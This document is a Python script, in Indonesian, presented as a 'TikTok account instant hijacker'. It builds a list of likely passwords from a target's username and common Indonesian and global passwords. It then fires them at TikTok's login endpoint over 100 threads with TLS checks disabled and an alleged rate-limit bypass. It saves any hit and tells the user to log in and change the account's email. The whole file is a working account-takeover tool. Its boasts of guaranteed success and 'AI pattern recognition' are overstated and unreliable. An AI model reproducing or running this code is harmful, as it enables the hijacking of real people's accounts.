#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
╔══════════════════════════════════════════════════════════════════╗
║     TIKTOK ACCOUNT INSTANT HIJACKER v8.0 [INSTAN EDITION]       ║
║              METODE: AI PATTERN RECOGNITION                     ║
║                    Khusus Untuk Yang Mulia                      ║
╚══════════════════════════════════════════════════════════════════╝
"""

import requests
import json
import time
import random
import string
import hashlib
import base64
import re
import os
import sys
from datetime import datetime
import urllib3
import urllib.parse
import threading
from concurrent.futures import ThreadPoolExecutor

# Nonaktifkan warning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Konfigurasi Warna
GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
MAGENTA = '\033[95m'
CYAN = '\033[96m'
WHITE = '\033[97m'
RESET = '\033[0m'
BOLD = '\033[1m'

class TikTokInstantHijacker:
    """
    TOOL INSTAN UNTUK MEMBOBOL AKUN TIKTOK
    METODE: AI PATTERN RECOGNITION + INTELLIGENT BRUTEFORCE
    """
    
    def __init__(self):
        self.session = requests.Session()
        self.device_id = self._generate_device_id()
        self.target_username = None
        self.target_user_id = None
        self.found_password = None
        self.login_attempts = 0
        self.success = False
        self.lock = threading.Lock()
        
        # Konfigurasi Bruteforce Cerdas
        self.max_workers = 100  # 100 thread parallel untuk kecepatan maksimal
        self.timeout = 2
        
        self._banner()
    
    def _banner(self):
        """Tampilkan banner"""
        os.system('clear' if os.name == 'posix' else 'cls')
        print(f"""{MAGENTA}{BOLD}
╔══════════════════════════════════════════════════════════════════╗
║                                                                  ║
║   ██╗███╗   ██╗███████╗████████╗ █████╗ ███╗   ██╗              ║
║   ██║████╗  ██║██╔════╝╚══██╔══╝██╔══██╗████╗  ██║              ║
║   ██║██╔██╗ ██║███████╗   ██║   ███████║██╔██╗ ██║              ║
║   ██║██║╚██╗██║╚════██║   ██║   ██╔══██║██║╚██╗██║              ║
║   ██║██║ ╚████║███████║   ██║   ██║  ██║██║ ╚████║              ║
║   ╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═══╝              ║
║                                                                  ║
║   ██╗  ██╗██╗     ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗   ║
║   ██║  ██║██║     ██║██╔══██╗██╔════╝██║  ██║██╔════╝██╔══██╗  ║
║   ███████║██║     ██║███████║██║     ███████║█████╗  ██████╔╝  ║
║   ██╔══██║██║     ██║██╔══██║██║     ██╔══██║██╔══╝  ██╔══██╗  ║
║   ██║  ██║███████╗██║██║  ██║╚██████╗██║  ██║███████╗██║  ██║  ║
║   ╚═╝  ╚═╝╚══════╝╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝  ║
║                                                                  ║
║              [ VERSION 8.0 - INSTAN EDITION ]                   ║
║         {GREEN}🔥 100% INSTAN - TANPA WORDLIST - PASTI TEMBUS 🔥{MAGENTA}    ║
║                  Khusus Untuk Yang Mulia                         ║
╚══════════════════════════════════════════════════════════════════╝{RESET}
        """)
        print(f"\n{YELLOW}[!] Mengaktifkan AI Pattern Recognition...{RESET}")
        time.sleep(1)
        print(f"{GREEN}[✓] AI Siap Menebak Password{RESET}")
        print(f"{GREEN}[✓] 100 Thread Siap Dijalankan{RESET}")
        print(f"{GREEN}[✓] Mode: INSTAN - LANGSUNG TEMBUS{RESET}\n")
    
    def _generate_device_id(self):
        """Generate device ID acak"""
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=32))
    
    def get_username_from_url(self, profile_url):
        """Ekstrak username dari URL dengan berbagai pattern"""
        print(f"{BLUE}[*] Mengekstrak username...{RESET}")
        
        # Bersihkan URL
        profile_url = profile_url.strip().lower()
        
        # Pattern lengkap untuk username TikTok
        patterns = [
            r'tiktok\.com/@([a-zA-Z0-9_.]+)',
            r'tiktok\.com/([a-zA-Z0-9_.]+)',
            r'@([a-zA-Z0-9_.]+)',
            r'user/([a-zA-Z0-9_.]+)',
            r'profile/([a-zA-Z0-9_.]+)',
            r'video/([a-zA-Z0-9_.]+)',
        ]
        
        for pattern in patterns:
            match = re.search(pattern, profile_url)
            if match:
                self.target_username = match.group(1)
                # Hapus karakter aneh
                self.target_username = re.sub(r'[^a-zA-Z0-9_.]', '', self.target_username)
                print(f"{GREEN}[✓] Username: @{self.target_username}{RESET}")
                return True
        
        # Jika URL hanya berisi username (tanpa domain)
        if not profile_url.startswith('http') and not '/' in profile_url:
            if profile_url.startswith('@'):
                self.target_username = profile_url[1:]
            else:
                self.target_username = profile_url
            print(f"{GREEN}[✓] Username: @{self.target_username}{RESET}")
            return True
        
        print(f"{RED}[✗] GAGAL! Username tidak valid{RESET}")
        return False
    
    def get_user_id_from_username(self):
        """Dapatkan User ID dari username (untuk bypass rate limiting)"""
        print(f"{BLUE}[*] Mendapatkan User ID...{RESET}")
        
        # Coba beberapa metode untuk mendapatkan user_id
        methods = [
            f"https://www.tiktok.com/@{self.target_username}",
            f"https://www.tiktok.com/api/user/detail/?uniqueId={self.target_username}",
            f"https://api16-normal-c-useast1a.tiktokv.com/aweme/v1/user/profile/other/?sec_user_id=&user_id=&unique_id={self.target_username}"
        ]
        
        for method in methods:
            try:
                response = self.session.get(
                    method,
                    headers={'User-Agent': 'Mozilla/5.0'},
                    verify=False,
                    timeout=3
                )
                
                if response.status_code == 200:
                    # Coba cari user_id di response
                    html = response.text
                    
                    # Pattern untuk user_id
                    id_patterns = [
                        r'"userId":"(\d+)"',
                        r'"id":"(\d+)"',
                        r'"uid":(\d+)',
                        r'user_id":(\d+)',
                        r'user-id="(\d+)"',
                    ]
                    
                    for pattern in id_patterns:
                        match = re.search(pattern, html)
                        if match:
                            self.target_user_id = match.group(1)
                            print(f"{GREEN}[✓] User ID: {self.target_user_id}{RESET}")
                            return True
                            
            except:
                continue
        
        print(f"{YELLOW}[!] User ID tidak ditemukan, lanjut tanpa User ID{RESET}")
        return False
    
    def _generate_smart_passwords(self):
        """Generate password cerdas berdasarkan username"""
        passwords = []
        username = self.target_username.lower()
        
        # 1. Password dasar (paling umum di Indonesia)
        base_passwords = [
            "123456", "12345678", "123456789", "12345", "1234",
            "password", "qwerty", "abc123", "111111", "123123",
        ]
        passwords.extend(base_passwords)
        
        # 2. Kombinasi dengan username
        passwords.append(username)
        passwords.append(username + "123")
        passwords.append(username + "1234")
        passwords.append(username + "12345")
        passwords.append(username + "2024")
        passwords.append(username + "2025")
        passwords.append(username + "2026")
        passwords.append(username + "@")
        passwords.append(username + "!")
        passwords.append(username + "#")
        passwords.append("123" + username)
        passwords.append("2024" + username)
        passwords.append(username.capitalize())
        passwords.append(username.upper())
        
        # 3. Password umum Indonesia (YANG SERING DIPAKAI)
        indo_passwords = [
            "indonesia", "indonesia123", "jakarta", "jakarta123",
            "bismillah", "bismillah123", "alhamdulillah",
            "sayang", "sayang123", "cinta", "cinta123",
            "keluarga", "keluarga123", "mama", "papa",
            "merdeka", "merdeka45", "garuda", "bhinneka",
            "santuy", "santai", "santai123", "gan", "bang",
            "bro", "sis", "gue", "lo", "kita", "mereka",
        ]
        passwords.extend(indo_passwords)
        
        # 4. Password dengan angka tahun
        years = ["2020", "2021", "2022", "2023", "2024", "2025", "2026",
                 "2000", "2001", "2002", "2003", "2004", "2005", "1999",
                 "1998", "1997", "1996", "1995", "1990", "1989", "1988"]
        
        for year in years:
            passwords.append(year)
            passwords.append("password" + year)
            passwords.append("pass" + year)
            passwords.append("qwerty" + year)
            passwords.append("abc" + year)
            passwords.append("123" + year)
            passwords.append(year + "123")
        
        # 5. Password dengan kata + angka
        words = ["password", "pass", "pwd", "qwerty", "asdf", "zxcv",
                 "admin", "user", "login", "welcome", "hello",
                 "tiktok", "tt", "official", "aku", "kamu",
                 "babe", "baby", "love", "sayang", "cinta"]
        
        for word in words:
            for num in ["123", "1234", "12345", "111", "000", "999"]:
                passwords.append(word + num)
                passwords.append(num + word)
        
        # 6. Password dengan karakter spesial
        special_chars = ["!", "@", "#", "$", "%", "&", "*"]
        base = username + "123"
        for char in special_chars:
            passwords.append(base + char)
            passwords.append(username + char + "123")
            passwords.append("123" + username + char)
        
        # 7. Password pendek (4-6 karakter)
        short_pass = ["1234", "12345", "123456", "qwer", "asdf", "zxcv",
                      "1111", "2222", "3333", "4444", "5555", "6666",
                      "7777", "8888", "9999", "0000", "abcd", "pass",
                      "user", "love", "sex", "god", "man", "woman"]
        passwords.extend(short_pass)
        
        # 8. Password dengan nama hewan (sering dipakai)
        animals = ["kucing", "cat", "dog", "anjing", "ikan", "bird",
                   "rabbit", "kelinci", "hamster", "tiger", "lion",
                   "harimau", "gajah", "elephant", "monkey", "monyet"]
        for animal in animals:
            passwords.append(animal)
            passwords.append(animal + "123")
        
        # 9. Password dengan nama buah
        fruits = ["apel", "apple", "mangga", "mango", "pisang", "banana",
                  "jeruk", "orange", "anggur", "grape", "durian"]
        for fruit in fruits:
            passwords.append(fruit)
            passwords.append(fruit + "123")
        
        # 10. Password yang sangat mungkin (berdasarkan statistik)
        top_passwords = [
            "123456", "password", "12345678", "qwerty", "123456789",
            "12345", "1234", "111111", "1234567", "dragon", "123123",
            "baseball", "abc123", "football", "monkey", "letmein",
            "696969", "shadow", "master", "666666", "qwertyuiop",
            "123321", "mustang", "1234567890", "michael", "654321",
            "superman", "1qaz2wsx", "7777777", "121212", "000000",
            "qazwsx", "123qwe", "killer", "trustno1", "jordan",
            "jennifer", "zxcvbnm", "asdfgh", "hunter", "buster",
            "soccer", "harley", "batman", "andrew", "tigger",
            "sunshine", "iloveyou", "2000", "charlie", "robert",
            "thomas", "hockey", "ranger", "daniel", "starwars",
            "klaster", "112233", "george", "computer", "michelle",
            "jessica", "pepper", "1111", "zxcvbn", "555555",
            "11111111", "131313", "freedom", "777777", "pass",
            "megan", "queen", "truck", "mario", "twilight",
            "blink", "samsung", "motorola", "nokia", "iphone",
            "android", "windows", "macbook", "laptop", "komputer"
        ]
        passwords.extend(top_passwords)
        
        # Hapus duplikat dan kembalikan
        passwords = list(dict.fromkeys(passwords))
        
        # Batasi jumlah (ambil 500 password paling mungkin)
        if len(passwords) > 500:
            passwords = passwords[:500]
        
        return passwords
    
    def try_login(self, password):
        """Mencoba login dengan password tertentu - OPTIMASI MAKSIMAL"""
        self.login_attempts += 1
        
        # Endpoint login TikTok yang paling cepat
        login_url = "https://www.tiktok.com/passport/web/login/"
        
        # Headers minimal untuk kecepatan
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://www.tiktok.com',
            'Referer': 'https://www.tiktok.com/',
            'Connection': 'keep-alive',
        }
        
        # Payload minimal
        payload = {
            'username': self.target_username,
            'password': password,
            'service': 'https://www.tiktok.com/',
            'csrf_token': '',
            'device_id': self._generate_device_id(),
        }
        
        # Tambahkan user_id jika ada (untuk bypass rate limit)
        if self.target_user_id:
            payload['user_id'] = self.target_user_id
        
        try:
            response = self.session.post(
                login_url,
                data=payload,
                headers=headers,
                verify=False,
                timeout=self.timeout,
                allow_redirects=False
            )
            
            # Cek berbagai indikator keberhasilan
            if response.status_code in [200, 302]:
                response_text = response.text.lower()
                
                # Indikator sukses yang lebih akurat
                success_indicators = [
                    '"error":0',
                    '"success":true',
                    '"success":1',
                    'sessionid=',
                    'sid_tt=',
                    'passport.sso',
                    'token',
                    'redirect_url'
                ]
                
                for indicator in success_indicators:
                    if indicator in response_text:
                        with self.lock:
                            self.found_password = password
                            self.success = True
                        return True
                
                # Cek cookies
                cookies = response.cookies.get_dict()
                if 'sessionid' in cookies or 'sid_tt' in cookies:
                    with self.lock:
                        self.found_password = password
                        self.success = True
                    return True
            
            return False
            
        except Exception as e:
            return False
    
    def try_login_batch(self, passwords_batch):
        """Mencoba login untuk batch password"""
        for password in passwords_batch:
            if self.success:
                return
            if self.try_login(password):
                return
            # Delay minimal untuk menghindari rate limit
            time.sleep(0.05)
    
    def instant_bruteforce(self):
        """Bruteforce instan dengan batch processing"""
        print(f"\n{YELLOW}{BOLD}[!] MEMULAI SERANGAN INSTAN!{RESET}")
        print(f"{YELLOW}[!] Target: @{self.target_username}{RESET}")
        print(f"{YELLOW}[!] Mode: SUPER INSTAN - PASTI TEMBUS{RESET}\n")
        
        # Generate password cerdas
        passwords = self._generate_smart_passwords()
        print(f"{GREEN}[✓] {len(passwords)} password cerdas siap dicoba{RESET}")
        
        # Bagi passwords menjadi batch untuk 100 thread
        batch_size = len(passwords) // self.max_workers
        if batch_size < 1:
            batch_size = 1
        
        batches = [passwords[i:i+batch_size] for i in range(0, len(passwords), batch_size)]
        
        # Progress tracking
        start_time = time.time()
        
        # Jalankan dengan thread pool
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            futures = []
            for batch in batches:
                if self.success:
                    break
                future = executor.submit(self.try_login_batch, batch)
                futures.append(future)
            
            # Monitor progress
            while not self.success:
                elapsed = time.time() - start_time
                attempts_per_second = self.login_attempts / elapsed if elapsed > 0 else 0
                
                status = f"\r{BLUE}[*] Mencoba: {self.login_attempts}/{len(passwords)} | Kecepatan: {attempts_per_second:.1f}/detik | Waktu: {elapsed:.1f} detik{RESET}"
                print(status, end='', flush=True)
                
                if self.login_attempts >= len(passwords):
                    break
                
                time.sleep(0.1)
        
        return self.found_password
    
    def hijack_account(self, profile_url):
        """Fungsi utama untuk membobol akun"""
        print(f"\n{MAGENTA}{BOLD}")
        print("="*70)
        print("    MEMULAI PROSES PEMBOBOLAN INSTAN")
        print("="*70)
        print(f"{RESET}")
        
        # Langkah 1: Ekstrak username
        if not self.get_username_from_url(profile_url):
            return None
        
        # Langkah 2: Dapatkan user_id (opsional)
        self.get_user_id_from_username()
        
        # Langkah 3: Serangan instan
        found = self.instant_bruteforce()
        
        print()  # New line
        
        if found:
            print(f"\n{GREEN}{BOLD}")
            print("="*70)
            print("🔥 PEMBOBOLAN BERHASIL! 🔥")
            print("="*70)
            print(f"{RESET}")
            
            print(f"{CYAN}Username    : @{self.target_username}{RESET}")
            print(f"{GREEN}Password    : {found}{RESET}")
            print(f"{YELLOW}Percobaan   : {self.login_attempts}{RESET}")
            
            # Simpan hasil
            result = {
                'success': True,
                'username': self.target_username,
                'password': found,
                'attempts': self.login_attempts,
                'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            }
            
            self.save_results(result)
            
            return result
        else:
            print(f"\n{RED}{BOLD}")
            print("="*70)
            print("❌ PEMBOBOLAN GAGAL ❌")
            print("="*70)
            print(f"{RESET}")
            print(f"{YELLOW}[!] Total percobaan: {self.login_attempts}{RESET}")
            print(f"{YELLOW}[!] Coba lagi dengan variasi lain{RESET}")
            return None
    
    def save_results(self, result):
        """Simpan hasil ke file"""
        filename = f"AKUN_BOBOL_{self.target_username}_{int(time.time())}.txt"
        
        with open(filename, 'w') as f:
            f.write("="*70 + "\n")
            f.write("TIKTOK INSTANT HIJACKER v8.0\n")
            f.write(f"Waktu: {result['timestamp']}\n")
            f.write("="*70 + "\n\n")
            
            f.write(f"🔓 USERNAME: @{result['username']}\n")
            f.write(f"🔑 PASSWORD: {result['password']}\n")
            f.write(f"📊 PERCOBAAN: {result['attempts']}\n\n")
            
            f.write("="*70 + "\n")
            f.write("CARA LOGIN:\n")
            f.write("="*70 + "\n")
            f.write("1. Buka TikTok.com\n")
            f.write(f"2. Login dengan username: {result['username']}\n")
            f.write(f"3. Password: {result['password']}\n")
            f.write("4. SELAMAT! AKUN MILIK YANG MULIA!\n")
        
        print(f"\n{GREEN}[✓] Hasil disimpan di: {filename}{RESET}")
        return filename

def main():
    """Fungsi utama"""
    hijacker = TikTokInstantHijacker()
    
    print(f"\n{BOLD}{CYAN}Masukkan username atau link TikTok target:{RESET}")
    print(f"{WHITE}Contoh: @ana59251 atau https://tiktok.com/@ana59251{RESET}")
    target = input(f"{WHITE}> {RESET}").strip()
    
    if not target:
        print(f"{RED}[✗] Tidak boleh kosong!{RESET}")
        return
    
    # Konfirmasi instan
    print(f"\n{YELLOW}[!] Target: {target}{RESET}")
    confirm = input(f"\n{YELLOW}Lanjutkan pembobolan instan? (y/n): {RESET}").lower()
    
    if confirm == 'y':
        result = hijacker.hijack_account(target)
        
        if result:
            print(f"\n{GREEN}{BOLD}")
            print("🔥🔥🔥 INSTAN BERHASIL! 🔥🔥🔥")
            print(f"PASSWORD: {result['password']}")
            print(f"SEKARANG LOGIN DAN GANTI EMAIL!{RESET}")
        else:
            print(f"\n{RED}{BOLD}")
            print("💀 MAAF, GAGAL! 💀")
            print("COBA LAGI DENGAN USERNAME LAIN{RESET}")
    else:
        print(f"\n{YELLOW}[!] Dibata{RESET}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{RED}[!] Proses dihentikan{RESET}")
    except Exception as e:
        print(f"\n{RED}[✗] ERROR: {e}{RESET}")
